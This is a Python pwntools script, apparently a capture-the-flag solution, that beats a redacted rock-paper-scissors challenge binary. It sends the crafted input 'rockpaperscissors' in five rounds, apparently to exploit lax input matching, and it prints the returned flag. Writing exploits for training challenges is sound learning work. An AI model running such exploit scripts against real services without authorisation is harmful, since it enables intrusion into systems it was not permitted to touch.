#!/usr/bin/env python3
from pwn import *

# Configuration
context.log_level = 'debug'
context.arch = 'amd64'

# Binary and connection settings
BINARY = './game-redacted'  # Replace with actual binary name
# HOST = 'example.com'
# PORT = 12345

def get_connection(mode):
    """Get connection based on mode (local/remote)"""
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Mode must be 'local' or 'remote'")
        exit(1)

def exploit(conn):
    for _ in range(5):
        conn.sendlineafter(b"Type '1' to play a game", b'1')
        conn.sendlineafter(b"Please make your selection", b'rockpaperscissors')
    
    # Receive flag output
    conn.recvuntil(b"Congrats, here's the flag!")
    flag = conn.recvline().strip()
    log.success(f"Flag: {flag.decode()}")

    conn.interactive()

def main():
    import sys
    
    if len(sys.argv) != 2:
        log.error("Usage: python exploit.py [local|remote]")
        exit(1)
    
    mode = sys.argv[1]
    
    # Get connection
    conn = get_connection(mode)
    
    # Run exploit
    exploit(conn)
    
    # Clean up
    conn.close()

if __name__ == "__main__":
    main()
